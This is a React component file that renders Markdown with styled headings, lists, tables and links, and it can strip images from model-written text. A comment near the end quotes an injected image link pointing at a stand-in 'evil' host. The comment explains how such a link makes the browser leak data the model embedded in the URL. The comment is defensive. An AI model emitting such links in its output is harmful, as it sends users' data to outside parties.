"use client";

import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";

/** Plain text of rendered heading children, for ids and the "On this page" outline. */
function textOf(node: React.ReactNode): string {
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (node && typeof node === "object" && "props" in node) return textOf((node as { props: { children?: React.ReactNode } }).props.children);
  return "";
}

export function headingId(text: string) {
  return text.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
}

const components = {
  p: (props: React.ComponentProps<"p">) => <p className="mb-3 last:mb-0" {...props} />,
  ul: (props: React.ComponentProps<"ul">) => (
    <ul className="mb-3 list-disc space-y-1 pl-5 last:mb-0" {...props} />
  ),
  ol: (props: React.ComponentProps<"ol">) => (
    <ol className="mb-3 list-decimal space-y-1 pl-5 last:mb-0" {...props} />
  ),
  li: ({ className, ...props }: React.ComponentProps<"li">) => (
    <li
      className={cn(className?.includes("task-list-item") && "list-none pl-0", className)}
      {...props}
    />
  ),
  input: (props: React.ComponentProps<"input">) => (
    <input className="mr-1.5 -mt-0.5 inline-block size-3.5 align-middle accent-primary" disabled {...props} />
  ),
  h1: (props: React.ComponentProps<"h1">) => (
    <h1 id={headingId(textOf(props.children))} className="mt-6 mb-3 text-xl font-semibold first:mt-0" {...props} />
  ),
  h2: (props: React.ComponentProps<"h2">) => (
    <h2 id={headingId(textOf(props.children))} className="mt-6 mb-2 text-lg font-semibold first:mt-0" {...props} />
  ),
  h3: (props: React.ComponentProps<"h3">) => (
    <h3 id={headingId(textOf(props.children))} className="mt-4 mb-2 text-base font-semibold first:mt-0" {...props} />
  ),
  a: (props: React.ComponentProps<"a">) => (
    <a className="underline underline-offset-2" target="_blank" rel="noreferrer" {...props} />
  ),
  strong: (props: React.ComponentProps<"strong">) => (
    <strong className="font-semibold" {...props} />
  ),
  code: (props: React.ComponentProps<"code">) => (
    <code className="rounded bg-muted px-1 py-0.5 text-xs" {...props} />
  ),
  blockquote: (props: React.ComponentProps<"blockquote">) => (
    <blockquote className="border-l-2 pl-3 text-muted-foreground" {...props} />
  ),
  hr: (props: React.ComponentProps<"hr">) => <hr className="my-4 border-border" {...props} />,
  table: (props: React.ComponentProps<"table">) => (
    <div className="mb-3 overflow-x-auto">
      <table className="w-full border-collapse text-sm" {...props} />
    </div>
  ),
  th: (props: React.ComponentProps<"th">) => (
    <th className="border-b px-2 py-1 text-left font-semibold" {...props} />
  ),
  td: (props: React.ComponentProps<"td">) => <td className="border-b px-2 py-1" {...props} />,
};

/**
 * `noImages` is for model-written text: an injected "![x](https://evil/?d=...)" would make the browser
 * fetch that URL on render and leak whatever the model put in it. Wiki pages keep their images.
 */
export function MarkdownContent({ body, noImages = false }: { body: string; noImages?: boolean }) {
  return (
    <div className="text-sm text-foreground/90">
      <Markdown remarkPlugins={[remarkGfm]} components={components} disallowedElements={noImages ? ["img"] : undefined}>
        {body}
      </Markdown>
    </div>
  );
}
